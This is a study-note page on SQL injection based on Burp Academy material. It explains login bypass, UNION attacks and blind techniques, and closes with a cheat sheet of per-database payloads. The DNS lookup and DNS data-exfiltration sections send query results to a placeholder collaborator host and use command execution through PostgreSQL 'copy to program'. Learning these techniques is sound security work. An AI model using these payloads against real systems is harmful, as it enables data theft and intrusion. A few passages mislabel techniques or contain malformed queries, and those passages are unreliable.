---
title: SQL Injection
date: 2021-11-16T21:07:41+01:00
---
# SQL Injection

SQL injection vulnerabilities occur when developers fail to properly sanitise the parameters in an SQL query that are provided by users. You can use SQLi to leak data or mess with an application\'s logic.

## Burp Academy Sections

### Retrieving hidden data

Say a web app runs the following SQL query when the value of the parameter *q* is %s:

``` sql
SELECT * FROM products WHERE category = '%s' AND released = 1
```

When a user sends the request with the parameter `?q=Gifts'`--= the server runs the SQL query:

``` sql
SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1
```

If we want the server to return everything, we can send the request `?q=Gifts'+OR+1=1--`

``` sql
SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1
```

### Messing around with an app\'s logic

When a web application runs an SQL query when it tries log users in, it might use something like:

``` sql
SELECT * FROM users WHERE username = 'yeet' AND password = 'pass'
```

An attacker can bypass such a mechanism by sending a request like `yeet'--` the app runs following SQL query:

``` sql
SELECT * FROM users WHERE username = 'yeet'--' AND password = 'pass'
```

### Getting data from other tables

You can use the operator to retrieve data from other tables. Here is an example for `?q=Gifts' UNION SELECT * FROM users--`

``` sql
SELECT * FROM users WHERE username = 'Gifts' UNION SELECT * FROM users--' AND password = 'pass'
```

### Examining the databse in cases of SQLi

You can use the *information~schema~.tables* to get a list of tables from the database ans `SELECT * FROM v$version` to get the database version

### Blind SQL injection

When you don\'t see data being reflected to you, there still might be SQL injection vulnerabilities.

## UNION Attacks

The [UNION](https:www.w3schools.com/sql/sql_union.asp) operator in SQL is used to combine/concatenate the results of two queries into one. For a UNION query to b valid, two conditions must be met:

-   Both the queries must have the same number of columns
-   The data types of each column must be compatible

Therefore, to carry out a successful UNION based attack you must know how many columns are being returned by the database and which columns in the query have a suitable type with your injected query.

### Determining the number of columns

You can use two methods to figure out the number of columns:

1.  ORDER BY

    You can make several order by queries and the number of columns that the query has is one less than the value of the `ORDER BY` query we ran. For instance if an app throws an error at `ORDER BY 6`, than it has 5 columns.

2.  UNION

    You can also use the UNION operator with *n* number of NULL fields. The application throws an error until the number of NULL fields in the `UNION SELECT` match exactly the number of columns in the original query.

### Figuring out column types

In order to detect data types of columns, we can again use the UNION operator after determining the number of columns. You can use NULL fields and add a field of known type, checking for errors. If no errors occurs, than that column\'s data type is that field. An example sequence of test requests could look like:

    ' UNION SELECT 'a',NULL,NULL,NULL--
    ' UNION SELECT NULL,'a',NULL,NULL--
    ' UNION SELECT NULL,NULL,'a',NULL--
    ' UNION SELECT NULL,NULL,NULL,'a'--

### Retrieving Multiple Values in a Single Column in UNION Attacks

You can use concatenation techniques to combine two columns of data into one.

## Blind SQL Injection

Sometimes SQL injection vulnerabilities might occur even if you don\'t see the output of the queries you run. In those cases, it can be tested by using SLEEP operators, conditional responses and external service interaction.

### Using Conditional Responses

In MySQL you can use SUBSTRING operator to compare a character at a certain point, for instance you can use the following SQL query to check whether the first char of password is less than k:

``` sql
SELECT * FROM sessions WHERE cookie='xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's'-- AND username='yeet'
```

You can also figure out the length of a response by using:

``` sql
SELECT * FROM sessions WHERE cookie='xyz' AND (SELECT 'a' FROM Users WHERE Username = 'Administrator' AND LENGTH(Password)>1)='a'-- AND username='yeet'
```

You can use the Burp Suite\'s *Cluster Bomb* attack type to exploit blind XSS.

### Conditional Responses Using Errors

If the previous method doesn\'t work, we can induce an error in the target system if an error a different response to be returned by the server. Here is an example

``` sql
SELECT * FROM sessions WHERE cookie='xyz' AND (SELECT CASE WHEN (SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a' WHEN Username = 'Administrator' -- AND username='yeet'
```

If the first character is greater than 1, the SQL query tries to divide by 0 which throws an error. There are different methods and techniques you can use for each database type.

### Using Time Delays

If a web application doesn\'t reflect any indication about the query, we can still create conditionals time delays on the servers, and this can be used to leak information. When you use Burp Suite to exploit time-based blind XSS, you must force intruder to run in single-threaded mode.

``` sql
SELECT * FROM sessions WHERE cookie='xyz'; IF SELECT CASE WHEN (SUBSTRING(Password, 1, 1) > 'm') THEN sleep(10) ELSE sleep(0) END FROM Users WHEN Username = 'Administrator' -- AND username='yeet'
```

Of course, the techniques to trigger time delays may differ between different database types.

### Blind SQL injection with Out-Of-Band techniques

In the cases where no info about the result of the output is reflected in the response and the server runs the query asynchronously, there is no way to detect whether your injection was successful. In those cases, you can trigger out-of-band network interactions with the query to test whether your injection was successful. Combining this interaction with conditions, you can leak data. The techniques to trigger such interactions change drastically depending on the type of database being used in the back-end server, you can find a list of database-specific payloads in [*DNS Data Exfiltration*]{.spurious-link target="DNS Data Exfiltration"}

## Second Order SQL injection

Sometimes a web application records data sent by a user and saves ot temporarily, afterwards, perhaps after a certain amount of time, it uses this user input without sanitizing it in an SQL Query. This is called a second order SQL injection and can be detected using [*Blind SQL injection with Out-Of-Band techniques*]{.spurious-link target="*Blind SQL injection with Out-Of-Band techniques"}.

## Tips & Tricks

### String concatenation

-   *Oracle* `'foo'||'bar'`
-   *Microsoft* `'foo'+'bar'`
-   *PostgreSQL* `'foo'||'bar'`
-   *MySQL* `CONCAT('foo','bar')`

### Substring

-   *Oracle* `SUBSTR('foobar', 4, 2)`
-   *Microsoft* `SUBSTRING('foobar', 4, 2)`
-   *PostgreSQL* `SUBSTRING('foobar', 4, 2)`
-   *MySQL* `SUBSTRING('foobar', 4, 2)`

### Comments

-   *Oracle* `--comment`
-   *Microsoft* `--comment` `/*comment*/`
-   *PostgreSQL* `--comment` `/*comment*/`
-   *MySQL* `--[space]comment` `/*comment*/` `#comment`

### Get Version

-   *Oracle* `SELECT banner FROM v$version` OR `SELECT version FROM v$instance`
-   *Microsoft* `SELECT @@version`
-   *PostgreSQL* `SELECT version()`
-   *MySQL* `SELECT @@version`

### Database Content

-   *Oracle* `SELECT * FROM all_tables` AND `SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'`
-   *Microsoft* `SELECT * FROM information_schema.tables` AND `SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'`
-   *PostgreSQL* `SELECT * FROM information_schema.tables` AND `SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'`
-   *MySQL* `SELECT * FROM information_schema.tables` AND `SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'`

### Conditional errors

-   *Oracle* `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN to_char(1/0) ELSE NULL END FROM dual`
-   *Microsoft* `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END`
-   *PostgreSQL* `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN cast(1/0 as text) ELSE NULL END`
-   *MySQL* `SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a')`

### Stacking Queries

-   *Oracle* `No support`
-   *Microsoft,PostgreSQL,MySQL* `QUERY-1-HERE; QUERY-2-HERE`

### Delays

-   *Oracle* `dbms_pipe.receive_message(('a'),10)`
-   *Microsoft* `WAITFOR DELAY '0:0:10'`
-   *PostgreSQL* `SELECT pg_sleep(10)`
-   *MySQL* `SELECT sleep(10)`

### Conditional Delays

-   *Oracle* `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual`
-   *Microsoft* `IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10'`
-   *PostgreSQL* `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END`
-   *MySQL* `SELECT IF(YOUR-CONDITION-HERE,sleep(10),'a')`

### DNS Lookup

-   *Oracle*

``` sql
SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://YOUR-SUBDOMAIN-HERE.burpcollaborator.net/"> %remote;]>'),'/l') FROM dual
```

OR

``` sql
SELECT UTL_INADDR.get_host_address('YOUR-SUBDOMAIN-HERE.burpcollaborator.net')
```

-   *Microsoft* `exec master..xp_dirtree '//YOUR-SUBDOMAIN-HERE.burpcollaborator.net/a'`
-   *PostgreSQL* `copy (SELECT '') to program 'nslookup YOUR-SUBDOMAIN-HERE.burpcollaborator.net'`
-   *MySQL* WINDOWS ONLY: `LOAD_FILE('\\\\YOUR-SUBDOMAIN-HERE.burpcollaborator.net\\a');SELECT ... INTO OUTFILE '\\\\YOUR-SUBDOMAIN-HERE.burpcollaborator.net\a'`

### DNS Data Exfiltration

1.  Oracle

    ``` sql
    SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT YOUR-QUERY-HERE)||'.YOUR-SUBDOMAIN-HERE.burpcollaborator.net/"> %remote;]>'),'/l') FROM dual
    ```

2.  Microsoft

    ``` sql
    declare @p varchar(1024);set @p=(SELECT YOUR-QUERY-HERE);exec('master..xp_dirtree "//'+@p+'.YOUR-SUBDOMAIN-HERE.burpcollaborator.net/a"')
    ```

3.  PostgreSQL

    ``` sql
    --create OR replace function f() returns void as $$
    declare c text;
    declare p text;
    begin
    SELECT into p (SELECT YOUR-QUERY-HERE);
    c := 'copy (SELECT '''') to program ''nslookup '||p||'.YOUR-SUBDOMAIN-HERE.burpcollaborator.net''';
    execute c;
    END;
    $$ language plpgsql security definer;
    SELECT f();
    ```

4.  MySQL

    ``` sql
    -- WINDOWS ONLY
    SELECT YOUR-QUERY-HERE INTO OUTFILE '\\\\YOUR-SUBDOMAIN-HERE.burpcollaborator.net\a'
    ```